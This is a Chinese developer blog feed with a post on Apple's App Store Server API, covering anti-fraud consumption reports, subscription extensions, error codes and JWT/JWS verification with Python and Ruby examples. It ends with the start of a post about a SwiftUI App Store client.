格式示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;expirationIntent&quot;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&quot;originalTransactionId&quot;</span>: <span class="string">&quot;1000000954804912&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoRenewProductId&quot;</span>: <span class="string">&quot;com.apple.iap.month&quot;</span>,</span><br><span class="line">    <span class="string">&quot;productId&quot;</span>: <span class="string">&quot;com.apple.iap.month&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoRenewStatus&quot;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&quot;isInBillingRetryPeriod&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="string">&quot;signedDate&quot;</span>: <span class="number">1643028928116</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="提交防欺诈信息（Send-Consumption-Information）"><a href="#提交防欺诈信息（Send-Consumption-Information）" class="headerlink" title="提交防欺诈信息（Send Consumption Information）"></a>提交防欺诈信息（Send Consumption Information）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/transactions/</span>consumption/&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><p>这个接口的作用是提交防欺诈信息给苹果，具体可以查看文档 <a href="https://developer.apple.com/documentation/appstoreserverapi/send_consumption_information">Send Consumption Information</a> 。</p><p>当用户申请退款时，苹果通知（<code>CONSUMPTION_REQUEST</code>）开发者服务器，开发者可在12小时内，提供用户的信息（比如游戏金币是否已消费、用户充值过多少钱、退款过多少钱等），最后苹果收到这些信息，协助“退款决策系统” 来决定是否允许用户退款。详细可以查看我们之前的 <a href="https://juejin.cn/post/6974733392260644895#heading-25">文章内容</a> 了解更多。</p><blockquote><p>用户提交退款申请，苹果系统会于 48 小时内在报告问题中更新处理结果。 所以，开发者收到用户退款通知后，有 12 个小时决定是否要提供防欺诈信息给苹果。</p></blockquote><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-13.jpg" alt="AppStoreServerAPI-13"></p><blockquote><p>parameters 字段描述，详细见文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/send_consumption_information">Send Consumption Information</a></p></blockquote><p>请求的 Response Codes 为 <code>202</code> 就表示苹果收到了信息。</p><h4 id="延长用户订阅的时长（Extend-a-Subscription-Renewal-Date）"><a href="#延长用户订阅的时长（Extend-a-Subscription-Renewal-Date）" class="headerlink" title="延长用户订阅的时长（Extend a Subscription Renewal Date）"></a>延长用户订阅的时长（Extend a Subscription Renewal Date）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUT https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/subscriptions/</span>extend/&#123;originalTransactionId&#125;</span><br></pre></td></tr></table></figure><p>开发者一年有2次机会给订阅内购用户每次加90天免费补偿。也就是有自动订阅类型的 App，可以开发者主动在服务器给用户补偿(免费延长)用户的订单时间，每次最多是90天。详细见文档 <a href="https://developer.apple.com/documentation/appstoreserverapi/extend_a_subscription_renewal_date">Extend a Subscription Renewal Date</a>。</p><p>以下类型的订阅<strong>不符合</strong>续订日期延期的条件：</p><ul><li>免费优惠期内的订阅</li><li>处于账单重试状态的非活跃订阅</li><li>已经到期，处于宽限期状态的订阅</li><li>在过去365天内已经收到两次续订日期延期的订阅</li></ul><p>另外，苹果有一个提示：<code>当 App Store 计算开发者的佣金比例时，延长期不计入一年的付费服务。</code></p><p>简单来说，用户订阅项目满一年后，开发者可获 85% 净收入。而开发者给用户免费延长的时间，并不计入这一年的时间里！（懂了吧？）</p><p><img src="https://ihtcboy.com/images/2022-AppStoreServerAPI-14.jpg" alt="AppStoreServerAPI-14"></p><blockquote><p>parameters 字段描述，详细见文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/extendrenewaldaterequest">ExtendRenewalDateRequest | Apple Developer Documentation</a></p></blockquote><p>请求的 Response Codes 为 <code>200</code> 就表示请求成功。</p><h3 id="2-4-疑问解答"><a href="#2-4-疑问解答" class="headerlink" title="2.4 疑问解答"></a>2.4 疑问解答</h3><h4 id="Authorization-Bearer-signed-token"><a href="#Authorization-Bearer-signed-token" class="headerlink" title="Authorization: Bearer [signed token]"></a>Authorization: Bearer [signed token]</h4><p>每当用户访问受保护的路由或资源时，用户可以使用承载（bearer）模式发送 JWT，通常在 Authorization 标头中，内容格式如下： </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Authorization</span>: Bearer<span class="meta"> [signed token]</span></span><br></pre></td></tr></table></figure><p>随后，服务器会取出 token 中的内容，来返回对应的内容。需要注意，这个 token 不一定会储存在 cookie 中，如果存在 cookie 中的话，需要设置为 http-only，防止 XSS。另外，可以看到，如果在如Authorization: Bearer 中发送 token，则跨域资源共享（CORS）将不会成为问题，因为它不使用 cookie。</p><p>所以，JWT 的主要目的是在服务端和客户端之间以安全的方式来转移声明。主要的应用场景：</p><ul><li> 认证 Authentication</li><li> 授权 Authorization</li><li> 联合识别</li><li> 客户端会话（无状态的会话）</li></ul><h4 id="Error-Codes"><a href="#Error-Codes" class="headerlink" title="Error Codes"></a>Error Codes</h4><p>如果 token 无效或者失效时，返回内容：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Unauthenticated</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">Request</span> ID: <span class="number">7</span>F<span class="number">5</span>DBZ<span class="number">7</span>VDX<span class="number">677</span>TOPBAOEUXWSCY.<span class="number">0</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure><p>如果请求的 <code>originalTransactionId</code> 不存在，会报错 <code>4040005</code>(<a href="https://developer.apple.com/documentation/appstoreserverapi/originaltransactionidnotfounderror">OriginalTransactionIdNotFoundError</a>)：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;errorCode&quot;</span>: <span class="number">4040005</span>,</span><br><span class="line">    <span class="attr">&quot;errorMessage&quot;</span>: <span class="string">&quot;Original transaction id not found.&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其它的错误码：</p><table><thead><tr><th>Object</th><th>errorCode</th><th>errorMessage</th></tr></thead><tbody><tr><td>GeneralBadRequestError</td><td>4000000</td><td>Bad request.</td></tr><tr><td>InvalidAppIdentifierError</td><td>4000002</td><td>Invalid request app identifier.</td></tr><tr><td>InvalidRequestRevisionError</td><td>4000005</td><td>Invalid request revision.</td></tr><tr><td>InvalidOriginalTransactionIdError</td><td>4000008</td><td>Invalid original transaction id.</td></tr><tr><td>InvalidExtendByDaysError</td><td>4000009</td><td>Invalid extend by days value.</td></tr><tr><td>InvalidExtendReasonCodeError</td><td>4000010</td><td>Invalid extend reason code.</td></tr><tr><td>InvalidRequestIdentifierError</td><td>4000011</td><td>Invalid request identifier.</td></tr><tr><td>SubscriptionExtensionIneligibleError</td><td>4030004</td><td>Forbidden - subscription state ineligible for extension.</td></tr><tr><td>SubscriptionMaxExtensionError</td><td>4030005</td><td>Forbidden - subscription has reached maximum extension count.</td></tr><tr><td>AccountNotFoundError</td><td>4040001</td><td>Account not found.</td></tr><tr><td>AccountNotFoundRetryableError</td><td>4040002</td><td>Account not found. Please try again.</td></tr><tr><td>AppNotFoundError</td><td>4040003</td><td>App not found.</td></tr><tr><td>AppNotFoundRetryableError</td><td>4040004</td><td>App not found. Please try again.</td></tr><tr><td>OriginalTransactionIdNotFoundError</td><td>4040005</td><td>Original transaction id not found.</td></tr><tr><td>OriginalTransactionIdNotFoundRetryableError</td><td>4040006</td><td>Original transaction id not found. Please try again.</td></tr><tr><td>GeneralInternalError</td><td>5000000</td><td>An unknown error occurred.</td></tr><tr><td>GeneralInternalRetryableError</td><td>5000001</td><td>An unknown error occurred. Please try again.</td></tr></tbody></table><p>详细的错误码说明，参见文档：<a href="https://developer.apple.com/documentation/appstoreserverapi/error_codes">Error Codes</a>。</p><h4 id="查询用户订单的收据（Look-Up-Order-ID）-1"><a href="#查询用户订单的收据（Look-Up-Order-ID）-1" class="headerlink" title="查询用户订单的收据（Look Up Order ID）"></a>查询用户订单的收据（Look Up Order ID）</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET https:<span class="regexp">//</span>api.storekit.itunes.apple.com<span class="regexp">/inApps/</span>v1<span class="regexp">/lookup/</span>&#123;orderId&#125;</span><br></pre></td></tr></table></figure><p>通过这个接口，可以查询所有订单吗？还是只有使用 StoreKit2 创建的订单才能查询到？</p><p>答：目前笔者找了多笔 2020 年购买的项目订单号，都能通过 API 查询到。所以，<strong>此接口不限制订单的购买时期。</strong>（至少 2020 年后的可以查到，如有异常，欢迎大家评论区一起交流啊。）</p><h4 id="JWT-签名验证"><a href="#JWT-签名验证" class="headerlink" title="JWT 签名验证"></a>JWT 签名验证</h4><p>向 App Store Server API 发出的每个请求，都需要带上 JSON Web Token（JWT）令牌来授权。苹果建议不需要为每个 API 请求生成新令牌。为了从 App Store Server API 获得更好的性能，请重用已有的签名令牌，每个令牌有 60 分钟有效时间。</p><p>如果只是想获取 JWT 的有效负载 Payload 参数，可以直接 base64 Decode Payload 参数就行了，但是如果你需要验证签名，则必须使用到 Signture, Header。</p><p>可以用 Python 的 <code>PyJWT</code> 库来 decode：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;exxxxxx&quot;</span> <span class="comment">#需要解码的 token</span></span><br><span class="line"></span><br><span class="line">data = jwt.decode(token, options=&#123;<span class="string">&quot;verify_signature&quot;</span>: <span class="literal">False</span>&#125;)</span><br></pre></td></tr></table></figure><p>苹果的建议是：可以利用各种开源库，创建和签署JWT令牌。有关 JWT 更多信息，请参阅 <a href="https://jwt.io/">JWT.io</a>。</p><p>从 <a href="https://pyjwt.readthedocs.io/en/stable/api.html">PyJWT</a> 文档可以看到，JWT 验证的内容有：</p><ul><li>verify_signature：验证 JWT 加密签名</li><li>verify_aud：是否匹配 audience</li><li>verify_iss：是否匹配 issuer</li><li>verify_exp：是否过期</li><li>verify_iat：是否为整数</li><li>verify_nbf：是否为过去的时间（nbf 表示：Not Before 的缩写，表示 JWT Token 在这个时间之前是无效的。也就是生效时间。）</li></ul><p>所以，我们就能明白，验证 JWT 有那么内容。最重要的是验证 <code>verify_signature</code>，当验证签名的时候，利用公钥或者密钥来解密 Sign，和 base64UrlEncode(header) + “.” + base64UrlEncode(payload) 的内容完全一样的时候，表示验证通过。</p><p>验证的流程，示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">public_key = <span class="string">&quot;xxxx&quot;</span> <span class="comment">#公钥证书内容</span></span><br><span class="line"></span><br><span class="line">data = jwt.decode(token, key=public_key, algorithms=[<span class="string">&quot;ES256&quot;</span>])</span><br></pre></td></tr></table></figure><p>那么问题来了，苹果的公钥在那里获取？通过苹果开发者论坛找到了线索：</p><ul><li><a href="https://developer.apple.com/forums/thread/691464">Validate StoreKit2 in-app purchase jwsRepresentation in backend</a></li></ul><p>简单来说，JWS 的 x5c 头字段中包含一个证书链（x509），第一个证书包含用于验证 JWS 签名的公钥。从获取获取的 <code>signedTransactions</code> 中，取一个 token 解码的格式如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;ES256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;x5c&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;MIIEMDCCA7.....&quot;</span>,</span><br><span class="line">        <span class="string">&quot;MIIDFjCCApy.....&quot;</span>,</span><br><span class="line">        <span class="string">&quot;MIICQzCCAc......&quot;</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>证书可以从苹果 <a href="https://www.apple.com/certificateauthority/">Apple PKI</a> 页面下载。</p><p><code>x5c</code> 证书链中最后一个证书，对应苹果的证书 <a href="https://www.apple.com/certificateauthority/AppleRootCA-G3.cer">Apple Root CA - G3 Root</a>，但我们需要把 .cer 转换成 .pem 格式，命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -inform der -in AppleRootCA-G3.cer -out AppleRootCA-G3.pem</span><br></pre></td></tr></table></figure><blockquote><p>注解：<br>X.509：是一种证书标准，主要定义了证书中应该包含哪些内容。其详情可以参考 <a href="https://datatracker.ietf.org/doc/html/rfc5280">RFC5280</a>，SSL 使用的就是这种证书标准。<br>同样的 X.509 证书，可能有不同的编码格式，目前有以下两种编码格式：</p><ul><li>DER：Distinguished Encoding Rules，打开看是二进制格式，不可读.</li><li>PEM：Privacy Enhanced Mail，打开看文本格式，以”—–BEGIN…”开头，”—–END…”结尾,内容是BASE64编码。</li></ul></blockquote><p><code>AppleRootCA-G3.pem</code> 内容，和 <code>x5c</code> 证书链中最后一个证书的内容一样，如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">MIICQzCCAcmgAwIBAgIILcX8iNLFS5UwCgYIKoZIzj0EAwMwZzEbMBkGA1UEAwwSQXBwbGUgUm9vdCBDQSAtIEczMSYwJAYDVQQLDB1BcHBsZSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTETMBEGA1UECgwKQXBwbGUgSW5jLjELMAkGA1UEBhMCVVMwHhcNMTQwNDMwMTgxOTA2WhcNMzkwNDMwMTgxOTA2WjBnMRswGQYDVQQDDBJBcHBsZSBSb290IENBIC0gRzMxJjAkBgNVBAsMHUFwcGxlIENlcnRpZmljYXRpb24gQXV0aG9yaXR5MRMwEQYDVQQKDApBcHBsZSBJbmMuMQswCQYDVQQGEwJVUzB2MBAGByqGSM49AgEGBSuBBAAiA2IABJjpLz1AcqTtkyJygRMc3RCV8cWjTnHcFBbZDuWmBSp3ZHtfTjjTuxxEtX</span>/<span class="number">1</span>H<span class="number">7</span>YyYl<span class="number">3</span>J<span class="number">6</span>YRbTzBPEVoA/VhYDKX<span class="number">1</span>DyxNB<span class="number">0</span>cTddqXl<span class="number">5</span>dvMVztK<span class="number">517</span>IDvYuVTZXpmkOlEKMaNCMEAwHQYDVR<span class="number">0</span>OBBYEFLuw<span class="number">3</span>qFYM<span class="number">4</span>iapIqZ<span class="number">3</span>r<span class="number">6966</span>/ayySrMA<span class="number">8</span>GA<span class="number">1</span>UdEwEB/wQFMAMBAf<span class="number">8</span>wDgYDVR<span class="number">0</span>PAQH/BAQDAgEGMAoGCCqGSM<span class="number">49</span>BAMDA<span class="number">2</span>gAMGUCMQCD<span class="number">6</span>cHEFl<span class="number">4</span>aXTQY<span class="number">2</span>e<span class="number">3</span>v<span class="number">9</span>GwOAEZLuN+yRhHFD/<span class="number">3</span>meoyhpmvOwgPUnPWTxnS<span class="number">4</span>at+qIxUCMG<span class="number">1</span>mihDK<span class="number">1</span>A<span class="number">3</span>UT<span class="number">82</span>NQz<span class="number">60</span>imOlM<span class="number">27</span>jbdoXt<span class="number">2</span>QfyFMm+YhidDkLF<span class="number">1</span>vLUagM<span class="number">6</span>BgD<span class="number">56</span>KyKA==</span><br></pre></td></tr></table></figure><p>所以，具体的验证，参考 <a href="https://developer.apple.com/forums/thread/691464">Validate StoreKit2</a> 里给出的答案：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">good_signature?</span><span class="params">(jws_token)</span></span></span><br><span class="line">  raw = File.read <span class="string">&quot;/Users/steve1/downloads/AppleRootCA-G3.cer&quot;</span></span><br><span class="line">  apple_root_cert = OpenSSL::X509::Certificate.new(raw)</span><br><span class="line"></span><br><span class="line">  parts = jws_token.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">  decoded_parts = parts.map &#123; <span class="params">|part|</span> Base64.decode64(part) &#125;</span><br><span class="line">  header = JSON.parse(decoded_parts[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">  cert_chain =  header[<span class="string">&quot;x5c&quot;</span>].map &#123; <span class="params">|part|</span> OpenSSL::X509::Certificate.new(Base64.decode64(part))&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">unless</span> cert_chain.last == apple_root_cert</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> <span class="number">0</span>..(cert_chain.count - <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span> <span class="keyword">unless</span> cert_chain[n].verify(cert_chain[n+<span class="number">1</span>].public_key)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    decoded_token = JWT.decode(jws_token, cert_chain[<span class="number">0</span>].public_key, <span class="literal">true</span>, &#123; <span class="symbol">algorithms:</span> [<span class="string">&#x27;ES256&#x27;</span>] &#125;)</span><br><span class="line">    !decoded_token.<span class="literal">nil</span>?</span><br><span class="line">  <span class="keyword">rescue</span> JWT::JWKError</span><br><span class="line">    <span class="literal">false</span></span><br><span class="line">  <span class="keyword">rescue</span> JWT::DecodeError</span><br><span class="line">    <span class="literal">false</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>以上代码是用 Ruby 写的，大概实现验证的逻辑是，用苹果提供的 <code>AppleRootCA-G3.cer</code> 证书内容验证 JWT <code>x5c</code> 证书链中最后一个证书，然后利用 <code>x509</code> 证书链规范，验证剩下的每个证书链，最后用<code>x5c</code> 证书链中的第一个证书的公钥，来验证 JWT。</p><h4 id="Sign-in-with-Apple"><a href="#Sign-in-with-Apple" class="headerlink" title="Sign in with Apple"></a>Sign in with Apple</h4><p>除了 App Store Server API，还有 Sign in with Apple、App Store Connet API 等服务，都是使用 JWT 来传递。具体的要求和字段可能与 App Store Server API 不相同。比如 Sign in with Apple 的 JWT 不需要 <code>typ</code>，<code>sub</code> 与 <code>bid</code> 含义一样，都是表示 Bundle ID，app 的包名。所以这些规范也是一样，这些细节不一样时，开发者都需要踩坑然后才能知道，说明了规范的重要性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;ES256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kid&quot;</span>: <span class="string">&quot;ABC123DEFG&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;DEF123GHIJ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1637179036</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1693298100</span>,</span><br><span class="line">    <span class="string">&quot;aud&quot;</span>: <span class="string">&quot;https://appleid.apple.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;com.apple.test&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>小编开始想把所有订阅类型都详细讲解，但编写过程中发现事情很复杂，因为订阅型项目复杂，有很多字段和作用。限于文章篇幅问题，和苹果文档已经有详细的字段说明，所以本文主要是讲解App Store Server API 的整体流程和注意事项。如有错误或问题，欢迎大家评论区纠正和交流哈~</p><p>其次，App Store Server API 新接口带来的意义非常重大！<strong>以往内购形成产生大量黑灰产</strong>，利用苹果内购的各种环节的漏洞，通过汇率差、僵尸账号、恶意退款等方式，形成了一条产业链的工作室、团伙作案。去年开始，苹果提供了内购退款通知，今年提供了查询接口，还有相关的客服接口，虽然都是属于后期的响应，但在一定程度上，对于打击黑恶有重要一棒！</p><p>最后，从苹果开放的接口和理念来说，苹果注重用户体验，希望开放者能更好的服务用户！所以，2022年，希望与大家学习和分享有趣的技术，打磨优秀的产品体验和服务！一起努力加油~</p><p><strong>37手游 iOS 技术运营团队</strong>全体成员祝：</p><p>各位读者，<code>新年快乐</code>！<code>虎虎生威</code>！</p><blockquote><p>欢迎关注我们，了解更多 iOS 和 Apple 的资讯~</p></blockquote><h2 id="四、参考引用"><a href="#四、参考引用" class="headerlink" title="四、参考引用"></a>四、参考引用</h2><ul><li><a href="https://juejin.cn/post/6974733392260644895">苹果iOS内购三步曲：App内退款、历史订单查询、绑定用户防掉单！— WWDC21</a></li><li><a href="https://developer.apple.com/cn/news/?id=1mmydqta">现已推出新的 app 内购买功能 - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/look_up_order_id">Look Up Order ID | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/get_transaction_history">Get Transaction History | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/get_refund_history">Get Refund History | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/get_all_subscription_statuses">Get All Subscription Statuses | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/send_consumption_information">Send Consumption Information | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreserverapi/extend_a_subscription_renewal_date">Extend a Subscription Renewal Date | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/appstoreconnectapi/generating_tokens_for_api_requests">Generating Tokens for API Requests | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/documentation/sign_in_with_apple/generate_and_validate_tokens">Generate and Validate Tokens | Apple Developer Documentation</a></li><li><a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519 - JSON Web Token (JWT)</a></li><li><a href="https://my.oschina.net/throwable/blog/4955682">冷饭新炒：理解JWT的实现原理和基本使用 - Throwable</a></li><li><a href="http://p.agnihotry.com/post/validating_sign_in_with_apple_authorization_code/">Validating “Sign in with Apple” Authorization Code - Parikshit Agnihotry</a></li><li><a href="https://www.purchasely.com/blog/handle-jws-signature-for-apple-in-app-purchases">What is a JWS and how to encode it for Apple In-App Purchases?</a></li><li><a href="https://www.purchasely.com/blog/how-to-fight-fraud-in-app-subscriptions">Fraud in In-App Subscriptions : how to crack down on fraud from malicious users</a></li><li><a href="https://blog.51cto.com/u_6184526/2547503">JWT(JSON Web)使用_wichandy的技术博客_51CTO博客_jwt使用教程</a></li><li><a href="https://datatracker.ietf.org/doc/html/rfc7519">RFC 7519 - JSON Web Token (JWT)</a></li><li><a href="https://developer.apple.com/cn/app-store/subscriptions/">自动续期订阅 - App Store - Apple Developer</a></li><li><a href="https://stackoverflow.com/questions/59425161/getting-only-decoded-payload-from-jwt-in-python">Getting only decoded payload from JWT in python - Stack Overflow</a></li><li><a href="https://developer.apple.com/forums/thread/691464">Validate StoreKit2 in-app purchase jwsRepresentation in backend| Apple Developer Forums</a></li><li><a href="https://serverfault.com/questions/254627/how-do-i-convert-a-cer-certificate-to-pem">How do I convert a .cer certificate to .pem? - Server Fault</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7056976669139009573&quot;&gt;WWDC21 - App Store Server API 实践总结 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;关于 App Store 用户退款时并没有通知开发者，直到 2020 年 6 月苹果提供了退款通知，但是因为不是 API 方式，导致开发者不一定能收到退款通知。另外像用户充值成功但 app 没有提供金币或服务等，开发者一般无法判断用户是否真的付款了。综上，苹果在 WWDC21 带来了全新强大的 App Store Server API，本文让我们从了解到实践的过程，全面认识 App Store Server API。 &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="WWDC21" scheme="https://ihtcboy.com/tags/WWDC21/"/>
    
    <category term="App Store Server API" scheme="https://ihtcboy.com/tags/App-Store-Server-API/"/>
    
  </entry>
  
  <entry>
    <title>用 SwiftUI 实现一个开源的 App Store</title>
    <link href="https://ihtcboy.com/2022/01/10/2022-01-10_%E7%94%A8SwiftUI%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%80%E6%BA%90%E7%9A%84AppStore/"/>
    <id>https://ihtcboy.com/2022/01/10/2022-01-10_%E7%94%A8SwiftUI%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%BC%80%E6%BA%90%E7%9A%84AppStore/</id>
    <published>2022-01-10T09:50:16.000Z</published>
    <updated>2022-12-31T15:09:01.453Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于 <a href="https://juejin.cn/post/7051512478630412301">用 SwiftUI 实现一个开源的 App Store - 掘金</a>，欢迎关注我们 <a href="https://juejin.cn/user/1002387318511214">@37手游iOS技术运营团队</a> 。</p></blockquote><p>作者：iHTCboy</p><blockquote><p>App Store 在 iOS 11 之前，App 排行榜一直是衡量开发者 App 活跃度的指标，但在 iOS 11 后苹果弱化了榜单功能，改为了二级入口，导致查询榜单困难，编者通过深入调研最终实现了一个查看 App 榜单、搜索、信息、发布生效等强大功能的开源 App。</p></blockquote><span id="more"></span><p><img src="https://ihtcboy.com/images/2022-iAppStore-00.png" alt="iAppStore-00"></p><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>App Store 一直以来都是 iPhone 生态的最重要一环，在初代 iPhone 商店，因为 App 比较少，当时就有 <code>Top 25</code> 榜单：</p><p><img src="https://ihtcboy.com/images/2022-iAppStore-01.jpg" alt="iAppStore-01"></p><p>然后在后续的 App Store 迭代中，排行榜（<code>Top Charts</code>）一直是一个主要的入口，新用户基本都会从榜单下载 App，所以，榜单的重要性不容忽视。</p><p><img src="https://ihtcboy.com/images/2022-iAppStore-02.jpg" alt="iAppStore-02"></p><p>直到 2017 年，虽然占了不到 30% 的手机份额，但 iPhone 的体量已经非常大，App Store 应用数量已经达到 220 万。App Store 的展示和推荐，显然满足不了每天巨大的新 App，有越来越多的 App 希望得到关注；而另一方面，排行榜刷榜问题一直存在；还有就是 App Store 的设计已经满足不了需求！比如更新（<code>Updates</code>） 标签功能单一，就是负责显示需要更新的 App 列表。</p><p>所以，从 iOS 11 开始，苹果将 AppStore 重新设计，增加了 Today 和 Games 游戏标签入口，而排行榜列表放到了 Apps 标签的二级入口中。苹果加强了自己的编辑团队推荐的App，在游戏和应用标签分类的前面也加入了大区域的编辑推荐 App，如今已经看不到榜单了。</p><p><img src="https://ihtcboy.com/images/2022-iAppStore-03.jpg" alt="iAppStore-03"></p><p>而现在 iOS 15 中的 App Store 增加了更多的功能，比如产品页优化、自定产品页、App 内活动（In-App Events）等，目的很明显就是让开发者增加活跃内容，提升 App 日活和收入。</p><p>而排行榜功能，其实已经不单单是一个榜单的作用，经常这些年的沉淀，榜单基本已经稳定。比如大家看到的 App，常年不变，而冲到榜单的 App，会获得更多的下载量。<strong>对于开发者来说</strong>，榜单可以用来预测应用收入、使用量和下载量的一个重要指标。<strong>对于用户来说</strong>，发现一些有趣或者热门的 App，依然是部分老用户的习惯。</p><p>所以，编者希望通过实现一个 App Store 